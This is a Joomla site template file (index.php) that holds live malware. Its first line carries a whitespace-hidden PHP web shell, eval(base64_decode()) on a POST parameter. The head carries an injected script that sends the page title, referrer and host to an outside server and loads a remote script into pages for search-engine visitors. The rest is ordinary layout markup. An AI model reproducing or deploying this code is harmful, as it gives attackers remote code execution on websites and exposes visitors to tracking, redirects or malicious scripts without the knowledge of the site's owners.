<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n828e00']));?><?php /**  * @copyright	Copyright (C) 2011 JoomlaThemes.co - All Rights Reserved. **/
defined( '_JEXEC' ) or die( 'Restricted access' );
define( 'YOURBASEPATH', dirname(__FILE__) );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>">
<head>
<jdoc:include type="head" />
<?php require(YOURBASEPATH . DS . "functions.php"); ?>
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/styles.css" type="text/css" />

<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://alfabet.home.pl/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>
<body class="background">
<div id="header-w">
    	<div id="header">
        	<?php if ($this->countModules('logo')) : ?>
                <div class="logo">
                	<jdoc:include type="modules" name="logo" style="none" />
                </div>
            <?php else : ?>        
            	<a href="<?php echo $this->baseurl ?>/"><img src="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/images/logo.png" border="0" class="logo"></a>
            <?php endif; ?>
            <?php if ($this->countModules('top')) : ?> 
                <div class="top">
                    <jdoc:include type="modules" name="top" style="none"/>
                </div>
            <?php endif; ?>                         
		</div>          
</div>
<div id="main">
	<div id="slide-bg">
        	<?php if ($this->countModules('menu or search')) : ?>
        	<div id="navr"><div id="navl">
			<?php if ($this->countModules('search')) : ?>
                <div id="search">
                    <jdoc:include type="modules" name="search" style="none" />
                </div>
            <?php endif; ?>  
            <div id="nav">
		    	<jdoc:include type="modules" name="menu" style="none" />
			</div></div></div>
        	<?php endif; ?>
	</div>
	<div id="wrapper">
 		<div id="main-content">
				<?php if ($this->getBuffer('message')) : ?>
					<div id="message">
						<jdoc:include type="message" />
					</div>
				<?php endif; ?>      
					<?php if ($this->countModules('user1 or user2 or user3')) : ?>
                    <div id="mods1" class="spacer<?php echo $mainmod1_width; ?>">
                        <jdoc:include type="modules" name="user1" style="jaw" />
                        <jdoc:include type="modules" name="user2" style="jaw" />
                        <jdoc:include type="modules" name="user3" style="jaw" /> 
                    </div>
                    <?php endif; ?>
        <?php if ($this->countModules('breadcrumb')) : ?>
        	<jdoc:include type="modules" name="breadcrumb"  style="none"/>
        <?php endif; ?>                          
        <div class="full">
                    <div id="comp">                           
                    <div id="comp_<?php echo $compwidth ?>">
                    <div id="comp-i">
                        <jdoc:include type="component" />
                        <?php include "html/template.php"; ?>
                    </div>
                    </div>
                    <?php if ($this->countModules('left')) : ?>
                    <div id="leftbar-w">
                    <div id="sidebar">
                        <jdoc:include type="modules" name="left" style="jaw" />
                    </div>
                    </div>
                    <?php endif; ?>                      
                    </div>
                    <?php if ($this->countModules('right')) : ?>
                    <div id="rightbar-w">
                    <div id="sidebar">
                        <jdoc:include type="modules" name="right" style="jaw" />
                    </div>
                    </div>
                    <?php endif; ?>
		<div class="clr"></div>
        </div>     
        </div>     
        <div class="bot1"><div class="bot2"><div class="bot3"></div></div></div>
        <div class="shadow2"></div>
  </div>
</div>
		<?php if ($this->countModules('user4 or user5 or user6')) : ?>
		<div id="mods2" class="spacer<?php echo $mainmod2_width; ?>">
			<jdoc:include type="modules" name="user4" style="jaw" />
			<jdoc:include type="modules" name="user5" style="jaw" />
			<jdoc:include type="modules" name="user6" style="jaw" />
		</div>
		<?php endif; ?>   
<?php if ($this->countModules('user7 or user8 or user9 or user10')) : ?>
<div id="footer">
	<div class="footer-pad">
		<div id="mods3" class="spacer<?php echo $mainmod3_width; ?>">
			<jdoc:include type="modules" name="user7" style="jaw" />
			<jdoc:include type="modules" name="user8" style="jaw" />
			<jdoc:include type="modules" name="user9" style="jaw" />
            <jdoc:include type="modules" name="user10" style="jaw" />
		</div>
  </div>    
</div>        
<?php endif; ?>
<div id="bottom">
        <?php if ($this->countModules('copyright')) : ?>
            <div class="copy">
                <jdoc:include type="modules" name="copyright"/>
            </div>
        <?php endif; ?>
<div class="design"><a href="http://joomlathemes.co" target="_blank" title="free joomla themes">Joomla Templates</a> designed by <a href="http://webhostingtop.org" target="_blank" title="best web host">Web Hosting</a> Top</div>
</div>
</div>
</body>
</html>